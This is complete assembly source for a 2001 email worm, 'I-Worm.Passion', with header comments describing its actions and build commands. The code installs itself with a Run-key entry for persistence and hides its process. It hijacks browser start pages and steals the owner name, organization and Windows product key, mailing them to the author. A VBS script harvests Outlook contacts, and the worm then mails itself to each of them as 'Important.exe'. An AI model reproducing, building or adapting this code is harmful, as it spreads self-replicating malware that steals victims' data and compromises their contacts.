; comment #
; Name : I-Worm.Passion
; Author : PetiK
; Date : September 3rd - September 8th
; Size : 5120 byte (compiled with UPX tool)
; 
; Action : Copy itself to
;       * WINDOWS\SYSTEM\MsVbdll32.exe
;    Add in the key HKLM\Software\Microsoft\Windows\CurrentVersion\Run the value
;       * MsVbdll = WINDOWS\SYSTEM\MsVbdll32.exe
; 
;    In dependency on system counter it redirect URL to :
;       http://www.scody.net/ggdag/fra/testi/la_passion_orig.htm
; 
;    If the key HKCU\Software\[Check Passion] doesn't exist it send a mail to
;    passion@multimania.com some information about victim.
; 
;    It creates %windir%\AllMail.txt with all mails that it founds in the Outlook
;    Address Book and send a new mail :
; 
;       Subject : Take a look at this...
;       Body : It's very important. Mail me if you have some problems.
;       Attachment : Important.exe
; 
;    It sends a mail to passionworm@multimania.com (passionpetik) too with some informations.
; 
; To build the worm:
; @echo off
; tasm32 /ml /m9 Passion
; tlink32 -Tpe -c -x -aa Passion,,,import32,dllz
; upx -9 Passion.exe
; if exist *.obj del *.obj
; if exist *.map del *.map
; 
; To delete the worm:
; del %windir%\system\MsVbdll32.exe <= copy of the worm
; del %windir%\AllMail.txt      <= mails are saved here
; #

.586p
.model flat
.code

JUMPS

callx macro a
extrn a:proc
call a
endm

include useful.inc
include myinclude.inc

start:  call hide_worm

twin_worm:
    push  50
    mov   esi,offset orig_worm
    push  esi
    push  0
    callx GetModuleFileNameA

    mov   edi,offset copy_worm
    push  edi
    push  50
    push  edi
    callx GetSystemDirectoryA
    add   edi,eax   
    mov   eax,"VsM\"
    stosd
    mov   eax,"lldb"
    stosd
    mov   eax,"e.23"
    stosd
    mov   eax,"ex"
    stosd
    pop   edi

    push  0
    push  edi
    push  esi
    callx CopyFileA

reg_save:
    push  8
    push  edi
    push  1
    @pushsz "MsVbdll"
    @pushsz "Software\Microsoft\Windows\CurrentVersion\Run"
    push  80000002h
    callx SHSetValueA

check_connect:
    push  0
    push  offset connected
    callx InternetGetConnectedState
    dec   eax
    jnz   exec_other

system_counter:
    callx GetTickCount
    xor   edx,edx   
    mov   ecx,10
    div   ecx
    cmp   edx,2
    jne   check_connect
    call  change_page

chec_reg:
    push  offset regDisp
    push  offset regResu
    push  0
    push  0F003Fh
    push  0
    push  0
    push  0
    @pushsz "Software\[Check Passion]"
    push  80000001h
    callx RegCreateKeyExA
    push  [regResu]
    callx RegCloseKey
    cmp   [regDisp],1
    jne   vbs_file

search_info:
    push  50
    push  offset passion_txt
    callx GetWindowsDirectoryA
    @pushsz "\Passion.txt"
    push  offset passion_txt
    callx lstrcat

    call  CreateDate
    call  CreateTime
    push  offset passion_txt
    push  offset date
    @pushsz "Date"
    @pushsz "Date et Heure"
    callx WritePrivateProfileStringA
    push  offset passion_txt
    push  offset time
    @pushsz "Heure"
    @pushsz "Date et Heure"
    callx WritePrivateProfileStringA

    mov   esi,offset name_user
    call  name_size
    dd    30
    name_size:
    push  esi
    call  reg
    dd    1
    reg:
    @pushsz "RegisteredOwner"
    @pushsz "Software\Microsoft\Windows\CurrentVersion"
    push  80000002h
    callx SHGetValueA
    push  offset passion_txt
    push  offset name_user
    @pushsz "Nom d'enregistrement"
    @pushsz "Information systême"
    callx WritePrivateProfileStringA

    mov   esi,offset name_company
    call  company_size
    dd    30
    company_size:
    push  esi
    call  reg2
    dd    1
    reg2:
    @pushsz "RegisteredOrganization"
    @pushsz "Software\Microsoft\Windows\CurrentVersion"
    push  80000002h
    callx SHGetValueA
    push  offset passion_txt
    push  offset name_company
    @pushsz "Nom de l'entreprise"
    @pushsz "Information systême"
    callx WritePrivateProfileStringA

    mov   esi,offset number_key
    call  key_size
    dd    30
    key_size:
    push  esi
    call  reg3
    dd    1
    reg3:
    @pushsz "ProductKey"
    @pushsz "Software\Microsoft\Windows\CurrentVersion"
    push  80000002h
    callx SHGetValueA
    push  offset passion_txt
    push  offset number_key
    @pushsz "Numéro de la clé Windows"
    @pushsz "Information systême"
    callx WritePrivateProfileStringA

    push  50
    push  offset Systemini
    callx GetWindowsDirectoryA
    @pushsz "\Win.ini"
    push  offset Systemini
    callx lstrcat
    push  offset Systemini
    push  20
    push  offset org_pays
    push  offset default
    @pushsz "sCountry"
    @pushsz "intl"
    callx GetPrivateProfileStringA
    push  offset passion_txt
    push  offset org_pays
    @pushsz "Pays"
    @pushsz "Information systême"
    callx WritePrivateProfileStringA

    xor   eax,eax
    push  eax
    push  eax
    push  offset Message2
    push  eax
    push  [hMapi]
    callx MAPISendMail

vbs_file:
    pushad
    push  00h
    push  80h
    push  02h
    push  00h
    push  01h
    push  40000000h
    @pushsz "C:\passion.vbs"
    callx CreateFileA
    xchg  edi,eax
    push  0
    push  offset octets
    push  vbssize
    push  offset vbsd
    push  edi
    callx WriteFile
    push  edi
    callx CloseHandle
    popad

    push  1
    @pushsz "wscript C:\passion.vbs"
    callx WinExec
    push  1000
    callx Sleep
    @pushsz "C:\passion.vbs"
    callx DeleteFileA

start_scan:
    mov   edi,offset allmail
    push  edi
    push  50
    push  edi
    callx GetWindowsDirectoryA
    add   edi,eax
    mov   eax,"llA\"
    stosd
    mov   eax,"liaM"
    stosd
    mov   eax,"txt."
    stosd
    xor   eax,eax
    stosd

open_scan_mail:
    pushad
    push  00h
    push  80h
    push  03h
    push  00h
    push  01h
    push  80000000h
    push  offset allmail
    callx CreateFileA
    inc   eax
    je    end_spread
    dec   eax
    xchg  eax,ebx

    xor   eax,eax
    push  eax
    push  eax
    push  eax
    push  2
    push  eax
    push  ebx
    callx CreateFileMappingA
    test  eax,eax
    je    end_s1
    xchg  eax,ebp

    xor   eax,eax
    push  eax
    push  eax
    push  eax
    push  4
    push  ebp
    callx MapViewOfFile
    test  eax,eax
    je    end_s2
    xchg  eax,esi

    push  0
    push  ebx
    callx GetFileSize
    cmp   eax,3
    jbe   end_s3

scan_mail:
    xor   edx,edx
    mov   edi,offset mail_addr
    push  edi
    p_c:  lodsb
    cmp   al," "
    je    car_s
    cmp   al,0dh
    je    entr1
    cmp   al,0ah
    je    entr2
    cmp   al,"#"
    je    f_mail     
    cmp   al,'@'
    jne   not_a
    inc   edx
    not_a:  stosb
        jmp p_c
    car_s:  inc esi
        jmp p_c
    entr1:  xor al,al
        stosb
        pop edi
        test edx,edx
        je  scan_mail
        call send_mail
        jmp scan_mail
    entr2:  xor al,al
        stosb
        pop edi
        jmp scan_mail
    f_mail:


end_s3: push  esi
    callx UnmapViewOfFile
end_s2: push  ebp
    callx CloseHandle
end_s1: push  ebx
    callx CloseHandle
end_spread:
    popad
    jmp   end_w

exec_other:
    push  10000
    callx Sleep
    push  0
    push  offset copy_worm
    callx WinExec
end_w:  push  00h
    callx ExitProcess

hide_worm:
    pushad
    @pushsz "Kernel32.dll"
    callx GetModuleHandleA
    xchg  eax,ecx
    jecxz end_hide_worm
    @pushsz "RegisterServiceProcess"
    push  ecx
    callx GetProcAddress
    xchg  eax,ecx
    jecxz end_hide_worm
    push  1
    push  0
    call  ecx
    end_hide_worm:
    popad
    ret

change_page:
    pushad
    call  @value
    db    "Default_Page_URL",0
    db    "Search Page",0
    db    "Start Page",0
    db    "Local Page",0
    @value: pop  esi
    push  4
    pop   ecx
    p_loop:
    push  ecx
    push  32
    @pushsz "http://www.scody.net/ggdag/fra/testi/la_passion_orig.htm"
    push  1
    push  esi
    @pushsz "Software\Microsoft\Internet Explorer\Main"
    push  80000001h
    callx SHSetValueA
    @endsz
    pop   ecx
    loop  p_loop
    popad
    ret

CreateDate Proc
    pushad
    mov   edi,offset date
    push  32
    push  edi
    @pushsz "ddd, dd MMM yyyy"
    push  0
    push  0
    push  9
    callx GetDateFormatA
    popad
    ret
CreateDate EndP
CreateTime Proc
    pushad
    mov   edi,offset time
    push  32
    push  edi
    @pushsz "HH:mm:ss"
    push  0
    push  0
    push  9
    callx GetTimeFormatA
    popad
    ret
CreateTime EndP

send_mail:
    xor   eax,eax
    push  eax
    push  eax
    push  offset Message
    push  eax
    push  [hMapi]
    callx MAPISendMail
    ret

.data
; === copy_worm ===
orig_worm   db 50 dup (0)
copy_worm   db 50 dup (0)

date        db 17 dup (?)
time        db 9 dup (?)


; === search_info ===
name_user   dd 0
name_company    dd 0
number_key  dd 0
default     db 0
Systemini   db 50 dup (0)
org_pays    db 20 dup(0)
passion_txt db 50 dup (0)
regDisp     dd 0
regResu     dd 0


; === spread ===
connected   dd 0
octets      dd ?
allmail     db 50 dup (0)
mail_addr   db 128 dup (?)
hMapi       dd 0

subject     db "Take a look at this...",0
body        db "It's very important. Mail me if you have some problems.",0
name_mail   db "Important.exe",0
subject2    db "Worm.Passion",0
body2       db "Another person",0
mail_me     db "passionworm@multimania.com",0

Message     dd ?
        dd offset subject
        dd offset body
        dd ?
        dd ?
        dd ?
        dd 2
        dd offset MsgFrom
        dd 1
        dd offset MsgTo
        dd 1
        dd offset Attach

Message2    dd ?
        dd offset subject2
        dd offset body2
        dd ?
        dd ?
        dd ?
        dd 2
        dd offset MsgFrom
        dd 1
        dd offset MsgTo2
        dd 1
        dd offset Attach2

MsgFrom     dd ?
        dd ?
        dd ?
        dd ?
        dd ?

MsgTo       dd ?
        dd 1
        dd offset mail_addr
        dd offset mail_addr
        dd ?
        dd ?


MsgTo2      dd ?
        dd 1
        dd ?
        dd offset mail_me
        dd ?
        dd ?

Attach      dd ?
        dd ?
        dd ?
        dd offset orig_worm
        dd offset name_mail
        dd ?

Attach2     dd ?
        dd ?
        dd ?
        dd offset passion_txt
        dd ?
        dd ?


vbsd:   db 'On Error Resume Next',0dh,0ah
    db 'Set rush=CreateObject("Outlook.Application")',0dh,0ah
    db 'Set chan=rush.GetNameSpace("MAPI")',0dh,0ah
    db 'Set fso=CreateObject("Scripting.FileSystemObject")',0dh,0ah
    db 'Set txt=fso.CreateTextFile(fso.GetSpecialFolder(0)&"\AllMail.txt")',0dh,0ah
    db 'txt.Close',0dh,0ah
    db 'For Each M In chan.AddressLists',0dh,0ah
    db 'If M.AddressEntries.Count <> 0 Then',0dh,0ah
    db 'For O=1 To M.AddressEntries.Count',0dh,0ah
    db 'Set P=M.AddressEntries(O)',0dh,0ah
    db 'Set txt=fso.OpenTextFile(fso.GetSpecialFolder(0)&"\AllMail.txt",8,true)',0dh,0ah
    db 'txt.WriteLine P.Address',0dh,0ah
    db 'txt.Close',0dh,0ah
    db 'Next',0dh,0ah
    db 'End If',0dh,0ah
    db 'Next',0dh,0ah
    db 'Set txt=fso.OpenTextFile(fso.GetSpecialFolder(0)&"\AllMail.txt",8,true)',0dh,0ah
    db 'txt.WriteLine "#"',0dh,0ah
    db 'txt.Close',0dh,0ah
vbssize equ $-vbsd


signature   db "I-Worm.Passion",00h
author      db "Coded by PetiK - 2001",00h

end start
end
